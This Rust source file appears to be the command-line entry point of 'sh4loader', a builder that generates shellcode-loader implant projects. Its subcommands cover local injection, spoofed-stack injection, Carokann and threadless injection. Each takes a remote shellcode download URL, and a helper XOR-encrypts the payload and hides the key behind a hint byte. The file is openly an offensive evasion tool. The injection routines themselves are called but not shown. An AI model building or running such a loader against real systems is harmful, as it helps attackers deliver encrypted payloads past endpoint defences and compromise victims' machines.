use clap::Parser;
use console::style;
use sh4loader::config::args::Args;
use sh4loader::config::args::Commands;
use sh4loader::config::structs::BANNER;
use sh4loader::generate_carokannspoofstackslocalinj;
use sh4loader::generate_kannthreadlessinj;
use sh4loader::generate_kannthreadlessstackinj;
use sh4loader::generate_localcommoninj;
use sh4loader::generate_protected_key;
use sh4loader::generate_random_key;
use sh4loader::generate_spoofstackslocalinj;
use sh4loader::print_hex;
use std::fs::File;
use std::io::prelude::*;
fn main() {
    println!("{}", style(BANNER).bold().red());
    let args = Args::parse();
    match args.cmd {
        Commands::Common {
            shellcode_url,
            output_path,
            shellcode_path,
            debug,
        } => {
            if debug {
                println!("{} Implant Debug mode enabled", style("[*]").green().bold());
            }
            println!(
                "{} Shellcode download url: {}",
                style("[*]").green().bold(),
                style(shellcode_url.clone()).cyan().bold()
            );
            println!(
                "{} Implants project Output: {}",
                style("[*]").green().bold(),
                style(output_path.clone()).cyan().bold()
            );
            println!(
                "{} Shellcode file: {}",
                style("[*]").green().bold(),
                style(shellcode_path.clone()).cyan().bold()
            );

            println!("{} Common Local Injection", style("[*]").yellow().bold());
            println!("{} Encrypt Shellcode...", style("[*]").green().bold());
            generate_localcommoninj(&output_path, &shellcode_path, &shellcode_url, debug);
        }
        Commands::KannSpoofstacks {
            shellcode_url,
            output_path,
            shellcode_path,
            debug,
        } => {
            if debug {
                println!("{} Implant Debug mode enabled", style("[*]").green().bold());
            }
            println!(
                "{} Shellcode download url: {}",
                style("[*]").green().bold(),
                style(shellcode_url.clone()).cyan().bold()
            );
            println!(
                "{} Implants project Output: {}",
                style("[*]").green().bold(),
                style(output_path.clone()).cyan().bold()
            );
            println!(
                "{} Shellcode file: {}",
                style("[*]").green().bold(),
                style(shellcode_path.clone()).cyan().bold()
            );
            println!(
                "{} Carokann Spoofstacks Local Injection",
                style("[*]").yellow().bold()
            );
            println!("{} Encrypt Shellcode...", style("[*]").green().bold());
            generate_carokannspoofstackslocalinj(
                &output_path,
                &shellcode_path,
                &shellcode_url,
                debug,
            );
        }
        Commands::Spoofstacks {
            shellcode_url,
            output_path,
            shellcode_path,
            debug,
        } => {
            if debug {
                println!("{} Implant Debug mode enabled", style("[*]").green().bold());
            }
            println!(
                "{} Shellcode download url: {}",
                style("[*]").green().bold(),
                style(shellcode_url.clone()).cyan().bold()
            );
            println!(
                "{} Implants project Output: {}",
                style("[*]").green().bold(),
                style(output_path.clone()).cyan().bold()
            );
            println!(
                "{} Shellcode file: {}",
                style("[*]").green().bold(),
                style(shellcode_path.clone()).cyan().bold()
            );
            println!(
                "{} Spoofstacks Local Injection",
                style("[*]").yellow().bold()
            );
            println!("{} Encrypt Shellcode...", style("[*]").green().bold());
            generate_spoofstackslocalinj(&output_path, &shellcode_path, &shellcode_url, debug);
        }
        Commands::KannThreadless {
            shellcode_url,
            output_path,
            shellcode_path,
            debug,
        } => {
            if debug {
                println!("{} Implant Debug mode enabled", style("[*]").green().bold());
            }
            println!(
                "{} Shellcode download url: {}",
                style("[*]").green().bold(),
                style(shellcode_url.clone()).cyan().bold()
            );
            println!(
                "{} Implants project Output: {}",
                style("[*]").green().bold(),
                style(output_path.clone()).cyan().bold()
            );
            println!(
                "{} Shellcode file: {}",
                style("[*]").green().bold(),
                style(shellcode_path.clone()).cyan().bold()
            );
            println!("{} Kann ThreadLess Injection", style("[*]").yellow().bold());
            println!("{} Encrypt Shellcode...", style("[*]").green().bold());
            generate_kannthreadlessinj(&output_path, &shellcode_path, &shellcode_url, debug);
        }
        Commands::KannThreadlessStack {
            shellcode_url,
            output_path,
            shellcode_path,
            debug,
        } => {
            if debug {
                println!("{} Implant Debug mode enabled", style("[*]").green().bold());
            }
            println!(
                "{} Shellcode download url: {}",
                style("[*]").green().bold(),
                style(shellcode_url.clone()).cyan().bold()
            );
            println!(
                "{} Implants project Output: {}",
                style("[*]").green().bold(),
                style(output_path.clone()).cyan().bold()
            );
            println!(
                "{} Shellcode file: {}",
                style("[*]").green().bold(),
                style(shellcode_path.clone()).cyan().bold()
            );
            println!(
                "{} Kann ThreadLess Stack Injection",
                style("[*]").yellow().bold()
            );
            println!("{} Encrypt Shellcode...", style("[*]").green().bold());
            generate_kannthreadlessstackinj(&output_path, &shellcode_path, &shellcode_url, debug);
        }
    }
}

// function to get input file and encrypt to output file

fn encrypt_file(input: &str, output: &str) {
    let mut file = File::open(input).expect("[-] File not found");
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)
        .expect("[-] Failed to read file");

    print!("{} Hint Byte: ", style("[+]").green());
    print_hex(&[0xBB]);
    let mut real_key: Vec<u8> = generate_random_key();
    let protected_key: Vec<u8> = generate_protected_key(0xBB, &mut real_key);

    print!("{} Original Key: ", style("[+]").green());
    print_hex(&real_key);
    print!("{} Protected Key: ", style("[+]").green());
    print_hex(&protected_key);

    // xor encrypt the file with the real_key
    for i in 0..buffer.len() {
        buffer[i] ^= real_key[i % real_key.len()];
    }

    let mut output_file = File::create(output).expect("Failed to create output file");
    output_file
        .write_all(&buffer)
        .expect("Failed to write to output file");
}
